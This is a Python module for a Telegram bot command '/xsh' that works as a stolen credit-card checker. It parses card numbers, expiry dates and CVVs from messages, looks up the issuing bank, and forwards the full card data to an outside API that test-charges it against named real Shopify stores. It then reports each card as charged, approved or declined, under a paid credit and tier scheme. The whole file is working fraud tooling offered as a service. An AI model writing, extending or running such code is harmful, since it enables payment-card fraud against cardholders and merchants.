import re
import random
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple
import asyncio
import aiohttp
from bin import get_bin_info
from database import update_user_credits, get_user_credits
from plans import get_user_current_tier
import html

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_URL = "https://xaeden.onrender.com/sh"

SHOPIFY_SITES = [
    "https://glovies.myshopify.com",
    "https://naturallclub.com",
    "https://brittnetta.com",
    "https://brightland.co",
]

last_command_time = {}


def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    return None


def extract_card_from_text(text: str) -> Optional[str]:
    patterns = [
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return f"{card_number}|{month}|{year}|{cvv}"
    return None


async def check_card(card_details: str, user_info: Dict) -> Optional[str]:
    parsed = parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /xsh card|mm|yy|cvv</i>"

    card_number, month, year, cvv = parsed

    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")

    max_retries = 3
    retry_count = 0
    last_error = None
    api_response = None

    while retry_count < max_retries:
        try:
            site_url = random.choice(SHOPIFY_SITES)
            params = {
                "cc": f"{card_number}|{month}|{year}|{cvv}",
                "url": site_url,
                "proxy": "",
            }

            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL, params=params, timeout=aiohttp.ClientTimeout(total=60)) as response:
                    try:
                        api_response = await response.json()
                    except Exception:
                        text = await response.text()
                        api_response = {"status": "Error", "message": text}
            break

        except Exception as e:
            logger.error(f"Error checking card (attempt {retry_count + 1}): {e}")
            last_error = str(e)
            retry_count += 1
            if retry_count < max_retries:
                await asyncio.sleep(1)

    if api_response is None:
        return f"⚠️ <b>Error checking card after {max_retries} attempts:</b> <code>{last_error}</code>"

    return format_response(api_response, user_info, card_details, brand, issuer, country_name, country_flag)


def format_response(api_response: Dict, user_info: Dict, card_details: str,
                    brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    message = str(api_response.get("Response", api_response.get("message", "N/A")))
    status = str(api_response.get("status", "N/A")).lower()

    if "charged" in status or "success" in status or "captured" in status:
        status_text = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙"
        status_emoji = "🔥"
    elif "approved" in status:
        status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
        status_emoji = "🟢"
    elif "declined" in status:
        status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
        status_emoji = "❌"
    else:
        if any(kw in message.lower() for kw in ["thank", "success", "approved", "charged"]):
            status_text = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙"
            status_emoji = "🔥"
        elif any(kw in message.lower() for kw in ["decline", "insufficient", "error", "fail"]):
            status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
            status_emoji = "❌"
        else:
            status_text = "𝙀𝙧𝙧𝙤𝙧"
            status_emoji = "⚠️"

    user_id = user_info.get("id", "Unknown")
    first_name = html.escape(user_info.get("first_name", "User"))
    user_tier = get_user_current_tier(user_id)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"

    formatted = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>{status_text}</b> {status_emoji}</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗫𝗮𝗲𝗱𝗲𝗻 𝗦𝗵𝗼𝗽𝗶𝗳𝘆</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""

    return formatted


async def handle_xsh_command(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    user_tier = get_user_current_tier(user_id)

    current_time = datetime.now()
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
            )
            return

    card_details = None
    if context.args:
        card_details = " ".join(context.args)
    elif update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = extract_card_from_text(replied_text)

    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /xsh card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /xsh</i>",
            parse_mode="HTML",
        )
        return

    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float("inf")
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)

    if not has_credits:
        await update.message.reply_text(
            f"<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝘾𝙧𝙚𝙙𝙞𝙩𝙨:</b>\n\n"
            f"<i>You have 0 credits left. Please recharge to continue.</i>\n\n"
            f"<b>Current Tier:</b> <code>{user_tier}</code>",
            parse_mode="HTML",
        )
        return

    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time

    progress_msg = (
        f"<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>\n"
        f"<pre>{card_details}</pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗫𝗮𝗲𝗱𝗲𝗻 𝗦𝗵𝗼𝗽𝗶𝗳𝘆</i>"
    )
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")

    user_info = {"id": user_id, "username": username, "first_name": first_name}

    async def background_check():
        try:
            result = await check_card(card_details, user_info)
            if result and not result.startswith("⚠️"):
                if not is_unlimited:
                    update_user_credits(user_id, -1)
                    updated = get_user_credits(user_id)
                    if updated is not None and updated <= 0:
                        result += "\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>"
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            await checking_message.edit_text(f"⚠️ <b>Error:</b> <code>{e}</code>", parse_mode="HTML")

    asyncio.create_task(background_check())
